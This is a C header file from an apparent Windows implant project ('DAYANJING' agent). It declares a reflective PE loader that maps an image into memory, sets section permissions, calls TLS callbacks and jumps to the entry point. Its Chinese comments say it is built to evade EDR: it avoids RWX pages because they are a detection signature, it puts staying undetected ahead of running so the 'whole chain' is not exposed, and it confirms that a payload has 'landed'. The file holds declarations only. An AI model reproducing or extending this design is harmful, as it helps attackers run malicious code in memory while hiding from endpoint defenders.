/*
 * agent_windows/include/reflect_run.h
 *
 * 反射加载执行驱动 —— 补齐 17_loader/reflect.c 明确留给平台层的三步：
 *   节区权限切换 / TLS 回调调用 / 入口点跳转
 *
 * 分工（本层不重复实现任何一层）：
 *   17_loader  pe_parse / reflect_load —— 头拷贝、节区映射、基址重定位、
 *                                        IAT 绑定、TLS 回调收集
 *   本层       在这之上做权限、调用顺序、入口语义，并强制失败即停
 *
 * 五条硬规则（违反即拒绝执行，不降级）：
 *   1. protect / call / resolve 三个回调任一缺失 -> 直接返回错误。
 *      绝不"默认给 RWX 继续执行"：RWX 页是 EDR 的强特征，静默降级等于
 *      把"能跑起来"置于"不被发现"之上，而前者失败只是一次崩溃，后者失败
 *      是整条链路暴露。
 *   2. 节区权限由 Characteristics 严格推导；可写且可执行的节区直接拒绝。
 *      给 W+X 开绿灯等于接受加壳/异常映像，且必然留下 RWX 页。
 *   3. 任一节区设权失败 -> 整体失败，绝不调用 TLS 或入口。
 *      部分设权的映像执行到未设权页会触发访问违例，而崩溃点与实际原因
 *      相隔很远，是最难排查的一类故障。
 *   4. TLS 回调先于入口点执行（与 Windows 加载器语义一致）；TLS 调用失败
 *      即中止，不继续调用入口。
 *   5. 入口点为 0 且无 TLS 回调 -> 返回 RR_ERR_NOENTRY，不允许静默空跑。
 *      "装载成功但什么都没执行"会被上层误判成"已落地生效"。
 *
 * 返回值约定：
 *   RR_OK / RR_ERR_* 为本层错误；PE 解析与映射阶段直接透传 17_loader 的
 *   LD_ERR_*（-1..-6）。故本层的 RR_ERR_* 从 -10 起，避免与之混淆。
 */
#ifndef DAYANJING_AGENT_WINDOWS_REFLECT_RUN_H
#define DAYANJING_AGENT_WINDOWS_REFLECT_RUN_H

#include "loader.h"

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

#define RR_OK             0

#define RR_ERR_PARAM    -10   /* 参数非法 */
#define RR_ERR_NOHOOK   -11   /* 必需回调缺失，拒绝降级执行 */
#define RR_ERR_PROT     -12   /* 节区权限设置失败 */
#define RR_ERR_WX       -13   /* 节区同时可写且可执行，拒绝加载 */
#define RR_ERR_TLS      -14   /* TLS 回调调用失败 */
#define RR_ERR_ENTRY    -15   /* 入口点调用失败 */
#define RR_ERR_NOENTRY  -16   /* 既无入口点也无 TLS 回调：不允许静默空跑 */

/* 节区权限位（与宿主无关的中间表示） */
#define RR_P_NONE 0
#define RR_P_R    1
#define RR_P_W    2
#define RR_P_X    4

/*
 * 权限切换回调。
 *   真机：VirtualProtect(addr, len, new_prot, &old)
 *   prot 为 RR_P_* 的按位或，宿主负责映射成平台常量。
 * 返回 0 成功，非 0 失败。
 */
typedef int (*rr_protect_fn)(void *ud, uint8_t *addr, size_t len, int prot);

/*
 * 调用回调（TLS 回调与入口点共用）。
 *   约定：以 Windows x64 调用约定调用 —— rcx=a1, rdx=a2, r8=a3。
 *   真机：((BOOL(WINAPI *)(HINSTANCE, DWORD, LPVOID))va)(a1, a2, a3)
 *   非 Windows 宿主可用内联汇编按 rcx/rdx/r8 置参后调用，用于验证。
 * 返回 0 表示"调用动作完成"（不代表被调者返回真），非 0 表示无法调用。
 * *ret 回填被调者返回值（DllMain 返回 0 即 FALSE）。
 */
typedef int (*rr_call_fn)(void *ud, uint64_t va,
                          uint64_t a1, uint64_t a2, uint64_t a3,
                          uint64_t *ret);

typedef struct {
    void               *ud;
    rr_protect_fn       protect;   /* 必需 */
    rr_call_fn          call;      /* 必需：TLS 与入口共用 */
    reflect_resolve_fn  resolve;   /* 必需：IAT 绑定 */
    void               *res_ud;
} rr_hooks_t;

typedef struct {
    uint8_t  *base;             /* region 起始 */
    size_t    size;
    uint64_t  entry_va;
    int64_t   delta;            /* (uintptr)region - ImageBase */
    uint32_t  n_reloc;
    uint32_t  n_import;
    uint32_t  n_sections_prot;  /* 实际完成设权的节区数 */
    size_t    n_tls;
    int       is_dll;           /* COFF Characteristics & IMAGE_FILE_DLL */
    int       prot_fail_at;     /* 设权失败的节区下标；-1 = 无失败 */
    int       tls_fail_at;      /* 调用失败的 TLS 下标；-1 = 无失败 */
    uint64_t  tls_ret;          /* 最后一个 TLS 回调的返回值 */
    uint64_t  entry_ret;        /* 入口点返回值 */
    int       entry_invoked;    /* 1 = 入口点确已被调用 */
} rr_result_t;

/*
 * 由 COFF 节区 Characteristics 推导权限。
 * 可执行节区强制带读（x86-64 上取指即读，纯执行页不可得）。
 * 同时具备 W 与 X 时返回 RR_ERR_WX —— 不静默给 RWX。
 */
int rr_protect_for(uint32_t chars, int *prot);

/*
 * 在 region 上反射加载 PE 并运行：
 *   映射 -> 重定位 -> IAT 绑定 -> TLS 收集 -> 逐节设权 -> TLS 调用 -> 入口调用
 * region_size 必须 >= pe_virtual_size()。
 * out 可为 NULL。返回 RR_OK 表示入口（或至少 TLS）确已执行。
 */
int rr_load_run(const uint8_t *pe, size_t pe_len,
                uint8_t *region, size_t region_size,
                const rr_hooks_t *h, rr_result_t *out);

const char *rr_errstr(int rc);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_REFLECT_RUN_H */
